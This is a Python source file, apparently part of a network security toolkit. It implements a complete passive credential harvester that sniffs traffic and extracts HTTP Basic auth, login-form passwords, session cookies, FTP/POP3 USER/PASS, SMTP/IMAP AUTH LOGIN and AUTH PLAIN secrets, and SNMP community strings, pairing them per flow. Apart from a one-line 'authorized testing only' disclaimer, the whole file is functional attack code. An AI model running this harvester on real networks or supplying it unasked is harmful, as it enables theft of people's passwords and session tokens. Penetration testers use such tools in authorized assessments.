"""Credential & secret harvester.

Passively extracts credentials and secrets from cleartext protocols in observed
traffic: HTTP Basic auth, HTTP login forms, cookies, FTP, SMTP/POP3/IMAP
(USER/PASS + AUTH LOGIN base64), and SNMP community strings.

Stateful per flow, so USER/PASS or AUTH LOGIN spread across packets get paired.
`extract(pkt)` is a pure-ish per-packet call (state lives on the instance), so
it is easy to unit-test with crafted packets and drive from the live tap.

For authorized security testing only.
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from urllib.parse import parse_qs, unquote_plus

_FORM_USER = ("user", "username", "login", "email", "userid", "user_name", "usr")
_FORM_PASS = ("pass", "password", "passwd", "pwd", "pass1", "user_pass")


@dataclass
class Credential:
    kind: str            # http-basic / http-form / cookie / ftp / smtp / pop3 / imap / snmp
    proto: str
    src: str = ""
    dst: str = ""
    username: str = ""
    secret: str = ""
    detail: str = ""

    def as_dict(self) -> dict:
        return {k: getattr(self, k) for k in self.__dataclass_fields__}


def _endpoints(pkt) -> tuple[str, str]:
    for ln, a, b in (("IP", "src", "dst"), ("IPv6", "src", "dst")):
        if pkt.haslayer(ln):
            layer = pkt.getlayer(ln)
            return str(layer.getfieldval(a)), str(layer.getfieldval(b))
    return "", ""


def _ports(pkt) -> tuple[int, int]:
    for ln in ("TCP", "UDP"):
        if pkt.haslayer(ln):
            layer = pkt.getlayer(ln)
            return int(layer.sport), int(layer.dport)
    return 0, 0


class CredentialExtractor:
    def __init__(self):
        from reforge.core.scapy_init import warmup
        warmup()
        # per-flow scratch: (src,sport,dst,dport) -> {"user":..., "auth_stage":...}
        self._flows: dict[tuple, dict] = {}

    def _flow(self, pkt) -> dict:
        src, dst = _endpoints(pkt)
        sport, dport = _ports(pkt)
        return self._flows.setdefault((src, sport, dst, dport), {})

    def extract(self, pkt) -> list[Credential]:
        from scapy.packet import Raw

        out: list[Credential] = []
        src, dst = _endpoints(pkt)

        # SNMP community (needs no Raw text)
        out += self._snmp(pkt, src, dst)

        if not pkt.haslayer(Raw):
            return out
        try:
            payload = bytes(pkt[Raw].load)
        except Exception:
            return out
        _, dport = _ports(pkt)
        text = payload.decode("latin-1", errors="replace")

        out += self._http(text, src, dst)
        out += self._line_protocols(text, self._flow(pkt), src, dst, dport)
        return out

    def extract_text(self, text: str, src: str, dst: str, dport: int,
                     flow_key: tuple) -> list["Credential"]:
        """Extract from reassembled application bytes (not a single packet)."""
        flow = self._flows.setdefault(flow_key, {})
        return self._http(text, src, dst) + self._line_protocols(text, flow, src, dst, dport)

    # ---- HTTP ---------------------------------------------------------------
    def _http(self, text: str, src: str, dst: str) -> list[Credential]:
        out: list[Credential] = []
        if not re.match(r"^(GET|POST|PUT|HEAD|DELETE|OPTIONS|PATCH) ", text) \
           and not text.startswith("HTTP/"):
            return out

        # Basic auth
        m = re.search(r"[Aa]uthorization:\s*Basic\s+([A-Za-z0-9+/=]+)", text)
        if m:
            try:
                dec = base64.b64decode(m.group(1)).decode("latin-1")
                if ":" in dec:
                    u, p = dec.split(":", 1)
                    out.append(Credential("http-basic", "HTTP", src, dst, u, p,
                                          "Authorization: Basic"))
            except Exception:
                pass

        # Cookies (session tokens)
        for cm in re.finditer(r"[Cc]ookie:\s*([^\r\n]+)", text):
            out.append(Credential("cookie", "HTTP", src, dst, secret=cm.group(1).strip(),
                                  detail="Cookie header"))

        # Form POST body
        if text.startswith("POST"):
            body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
            if body and "=" in body:
                fields = {k.lower(): v for k, v in
                          ((k, v[0]) for k, v in parse_qs(body).items())}
                user = next((fields[k] for k in _FORM_USER if k in fields), "")
                pwd = next((fields[k] for k in _FORM_PASS if k in fields), "")
                if user or pwd:
                    out.append(Credential("http-form", "HTTP", src, dst,
                                          unquote_plus(user), unquote_plus(pwd),
                                          "form POST"))
        return out

    # ---- line-oriented (FTP/SMTP/POP3/IMAP) ---------------------------------
    def _line_protocols(self, text: str, flow: dict, src: str, dst: str, dport: int) -> list[Credential]:
        out: list[Credential] = []
        proto = {21: "FTP", 25: "SMTP", 587: "SMTP", 110: "POP3", 143: "IMAP"}.get(dport)

        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            up = line.upper()

            # FTP / POP3 USER + PASS
            if up.startswith("USER "):
                flow["user"] = line[5:].strip()
            elif up.startswith("PASS ") and "user" in flow:
                out.append(Credential((proto or "ftp").lower(), proto or "FTP", src, dst,
                                      flow.pop("user"), line[5:].strip(), "USER/PASS"))

            # SMTP/IMAP AUTH LOGIN (base64 user then pass over subsequent lines)
            elif up.startswith("AUTH LOGIN"):
                flow["auth"] = "user"
            elif flow.get("auth") == "user" and _is_b64(line):
                flow["auth_user"] = _b64(line)
                flow["auth"] = "pass"
            elif flow.get("auth") == "pass" and _is_b64(line):
                out.append(Credential((proto or "smtp").lower(), proto or "SMTP", src, dst,
                                      flow.pop("auth_user", ""), _b64(line), "AUTH LOGIN"))
                flow.pop("auth", None)
            # AUTH PLAIN (base64 of \0user\0pass)
            elif up.startswith("AUTH PLAIN") and len(line.split()) >= 3 and _is_b64(line.split()[2]):
                try:
                    parts = _b64(line.split()[2]).split("\x00")
                    if len(parts) >= 3:
                        out.append(Credential((proto or "smtp").lower(), proto or "SMTP",
                                              src, dst, parts[1], parts[2], "AUTH PLAIN"))
                except Exception:
                    pass
        return out

    # ---- SNMP ---------------------------------------------------------------
    def _snmp(self, pkt, src: str, dst: str) -> list[Credential]:
        try:
            from scapy.layers.snmp import SNMP

            if pkt.haslayer(SNMP):
                community = pkt[SNMP].community.val
                if isinstance(community, bytes):
                    community = community.decode("latin-1", "replace")
                return [Credential("snmp", "SNMP", src, dst, secret=str(community),
                                   detail="community string")]
        except Exception:
            pass
        return []


def _is_b64(s: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z0-9+/]{4,}={0,2}", s)) and len(s) % 4 == 0


def _b64(s: str) -> str:
    try:
        return base64.b64decode(s).decode("latin-1", "replace")
    except Exception:
        return ""
